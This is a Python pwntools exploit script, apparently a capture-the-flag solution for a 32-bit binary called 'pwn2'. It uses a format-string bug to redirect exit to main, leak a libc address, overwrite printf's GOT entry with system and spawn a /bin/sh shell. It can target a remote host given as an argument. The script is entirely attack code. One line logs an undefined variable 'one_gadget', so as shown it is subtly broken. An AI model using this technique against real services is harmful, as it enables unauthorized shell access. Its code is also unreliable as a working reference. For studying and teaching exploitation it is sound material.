#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn2'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# elf, libc
main = 0x080485eb

# fmt1 exit->main, leak
fmt = fmtstr_payload(7,{elf.got['exit']:main},write_size='byte')
fmt+= 'AAAA%27$p'
sla('input: ',fmt)
ru('AAAA')
# leak
libc_start_main_241 = eval(rc(10))
info_addr('libc_start_main_241',libc_start_main_241)
libcbase = libc_start_main_241-241-libc.sym['__libc_start_main']
info_addr('libcbase',libcbase)
system = libcbase+libc.sym['system']
info_addr('one_gadget',one_gadget)
# fmt2 printf->system
fmt2 = fmtstr_payload(7,{elf.got['printf']:system},write_size='short')
# debug()
sla('input: ',fmt2)
sl('/bin/sh\0')

p.interactive()